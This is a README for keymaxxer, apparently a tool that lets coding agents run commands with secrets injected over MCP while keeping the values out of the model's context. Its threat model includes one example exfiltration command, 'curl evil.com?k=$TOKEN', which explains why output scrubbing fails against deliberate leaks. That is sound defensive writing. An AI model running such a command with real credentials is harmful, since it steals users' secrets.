<p align="center">
  <img src="keymaxxer-logo.png" alt="keymaxxer" width="360" />
</p>

# keymaxxer

**A secret manager for coding agents.** Let an agent *run* commands that need
your API keys, tokens, and connection strings — without the secret ever entering
its context window, its transcript, or your LLM provider's logs.

keymaxxer stores secrets in a single [Turso](https://turso.tech) database encrypted
at rest with AES-256-GCM. The encryption key is **derived from your passphrase
and never written to disk**. Each MCP server — **one per coding-agent session** —
unlocks the vault the first time it's needed and holds the key in its own memory
for the life of that session. Your coding agent talks to keymaxxer over MCP: it
sees secret *names*, asks keymaxxer to run a command with those secrets injected
as environment variables, and gets back output with every secret value scrubbed.

```
coding agent ─ run(cmd, secret names) ─▶ keymaxxer serve  (one per session)
   first use ─▶ asks you to unlock (passphrase dialog); key held in memory
               inject secret → run command → scrub output
coding agent ◀─ exit code + scrubbed output (never the secret)

session ends ─▶ key + approvals wiped
```

## Quick start

```bash
# install (or prefix any command with `npx keymaxxer …`)
npm install -g keymaxxer

# create the vault (prompts for a passphrase)
keymaxxer init

# store a secret — paste it at the hidden prompt (never in shell history)
keymaxxer set GITHUB_TOKEN --tag github
keymaxxer list
keymaxxer run --secrets GITHUB_TOKEN -- 'gh api /user'
```

`keymaxxer init` drops a `keymaxxer` MCP server into the project's `.mcp.json`, so
Claude Code, Cursor, and other MCP clients pick it up **in that project**.

To make keymaxxer available in **every** project in Claude Code, register it once
at user scope instead (the package is global, but the MCP registration is per
scope):

```bash
claude mcp add --scope user keymaxxer -- npx keymaxxer serve
```

## How an agent uses it

Three MCP tools, none of which ever returns a secret value:

- **`keymaxxer_list`** → the names + attributes (provider, account, environment,
  access, tags) of available secrets, so the agent can choose the right one.
- **`keymaxxer_run`** → run a shell command with named secrets injected as env vars.
  The agent writes `$NAME`; keymaxxer supplies the value to the child process only.
  Read-write/prod secrets prompt you for approval first.
- **`keymaxxer_add`** → ask you to add a missing secret. The agent suggests the
  name and attributes; you review/edit them and type the **value** into a dialog —
  the value goes straight to the vault and is never shared with the agent. (So the
  agent never tells you to paste a secret into the chat.)

```jsonc
// the agent calls:
{ "command": "curl -H \"Authorization: Bearer $OPENAI_KEY\" https://api.openai.com/v1/models",
  "secrets": ["OPENAI_KEY"] }
// keymaxxer runs it inside the MCP server and returns stdout/stderr with every
// occurrence of the key replaced by ***
```

If the vault is locked, the first tool call prompts **you** to unlock it (a native
passphrase dialog) — the agent just makes the call and waits.

## CLI

| Command | Description |
| --- | --- |
| `keymaxxer init` | Create the encrypted vault (prompts for a passphrase) |
| `keymaxxer set <NAME> [attrs]` | Store a secret (paste at a hidden prompt); attrs: `--provider --account --env --access --tag --description` |
| `keymaxxer import <file>` | Import `KEY=VALUE` lines from a `.env`-style file |
| `keymaxxer list` | List secret names + metadata (never values) |
| `keymaxxer rm <NAME>` | Delete a secret |
| `keymaxxer run --secrets a,b -- <cmd>` | Run a command with secrets injected as env vars |
| `keymaxxer audit [--limit N]` | Show the recent secret-access log |
| `keymaxxer serve` | Start the MCP server on stdio (holds the key for the session) |

Each command opens the vault on demand — it prompts for your passphrase, or reads
`KEYMAXXER_PASSPHRASE` / `KEYMAXXER_MASTER_KEY`. There's no separate unlock step
and no background daemon.

## Secret attributes

Beyond a name and value, each secret carries structured attributes so an agent
can pick the *right* credential instead of guessing from the name:

```bash
# paste the token at the hidden prompt when asked
keymaxxer set ORB_DEV_TOKEN \
  --provider orb --account turso --env dev --access read-write \
  --description "Orb developer account"
```

`keymaxxer_list` returns `provider`, `account`, `environment` (prod/dev/staging),
`access` (read-only/read-write/admin), tags, and description — never the value.
With those, an agent matches the provider/account a task targets, prefers the
right environment, and prefers the least-privileged credential that can do the
job. Rotating a value with `keymaxxer set` preserves the attributes.

## Approval & unlocking — without leaving your editor

Both interactions happen through a native dialog, so an agent can keep working
and you never drop to a terminal:

- **Locked vault.** The first time a session's tool call needs the vault,
  keymaxxer pops a dialog asking for your passphrase and unlocks it in place.
  (Agents are told *not* to ask you to unlock manually — the call itself prompts.)
- **Sensitive use.** Using a **read-write** or **production** secret is gated.
  The dialog shows the secret and the exact command and offers **Deny**,
  **Allow once**, or **Allow for the session**. *Allow for the session* remembers
  that one secret **for that agent's session only** — it's never shared with other
  sessions — so you aren't re-prompted on every call. Read-only / non-prod secrets
  run with no prompt.

This is the human-in-the-loop control that catches a command which would
otherwise misuse a credential (see the threat model). For headless/CI, set
`KEYMAXXER_APPROVE=deny|once|session` and `KEYMAXXER_PASSPHRASE` (or
`KEYMAXXER_MASTER_KEY`) to run non-interactively.

## Where things live, and how access is controlled

- **Vault:** one global `vault.db` per user (directory `0700` — only you can read it).
  Location resolution:
  1. `KEYMAXXER_DB_DIR` if set (no fallback)
  2. `$XDG_CONFIG_HOME/keymaxxer` if `XDG_CONFIG_HOME` is set and that directory exists
  3. otherwise `~/.keymaxxer`
- **Encryption key:** **stored nowhere.** It is derived from your passphrase
  with scrypt (a non-secret salt lives in `vault.meta.json` next to the vault). Copying
  `vault.db` off the machine yields nothing — there is no key at rest.
- **Who holds the key:** each process that needs it, only while it runs — an MCP
  server for its session, a CLI command for one invocation. There is **no shared
  daemon**; nothing keeps the key after the process exits.
- **Who can unlock:** whoever knows the passphrase. Not your coding agent.
- **Who can use a secret:** any process that can derive the key (your passphrase,
  or `KEYMAXXER_MASTER_KEY`); sensitive uses additionally require your interactive
  approval, scoped to the requesting session.
- **When:** for the life of the session — the key is wiped when the MCP server (or
  CLI command) exits, so closing the session locks it. Optionally set
  `KEYMAXXER_IDLE_MINUTES` to also re-lock a server after inactivity.
- **CI / headless:** set `KEYMAXXER_MASTER_KEY` (64-hex) — keymaxxer opens the
  vault directly with the key your platform supplies, exactly like the
  [Turso credentials gateway](https://turso.tech/blog/why-we-chose-turso-to-secure-ai-credentials).

## Threat model — read this

keymaxxer is honest about what a local tool can and cannot do.

**It defends against:** secrets reaching the model's context (and from there
provider logs, transcripts, or training); **accidental** leakage of a literal
value through command output (the scrubber catches `echo $TOKEN`); and plaintext
at rest. Because the key is passphrase-derived and never stored, a stolen
`vault.db` is useless and a locked vault exposes nothing. Sensitive
(read-write/prod) uses additionally require interactive human approval.

**The scrubber is literal-only.** It replaces exact occurrences of a secret
value in output, so it stops the `echo $TOKEN` footgun — but any command that
*transforms* the value (`base64`, hashing, or `curl evil.com?k=$TOKEN`) defeats
it. This is inherent: **any command that can use a secret can also exfiltrate
it.** The real defense against *deliberate* misuse is the two layers above it —
keeping the value out of the model's context, and **approval-on-use** for
sensitive secrets (you see the command and can deny it).

**It does not defend against** a fully malicious process running as the *same OS
user while a session holds the key* — it can read that process's memory. That is
irreducible without OS-level isolation; no local key store changes it. keymaxxer
keeps secrets out of the model's context, makes access ephemeral (per session)
and explicit, and puts a human in the loop for sensitive use; for stronger
isolation, run the agent as a separate user or in a sandbox — it composes cleanly.

## Built with Turso

The whole vault is one Turso database opened with native encryption:

```ts
const db = await connect(defaultVaultPath(), {
  encryption: { cipher: "aes256gcm", hexkey },  // hexkey = scrypt(passphrase, salt)
});
```

Encrypted files can only be opened by the Turso engine — copy the file and it's
unreadable without the key. No daemon for the database, no external service,
in-process.

## Development

```bash
bun install
# SDK smoke test + the end-to-end integration suite
bun run test
```

Workspace layout: `packages/sdk` (KDF, vault metadata, `SecretStore`, `Runner`,
`Scrubber`) and `packages/cli` (commands, approval gating, and the MCP server).
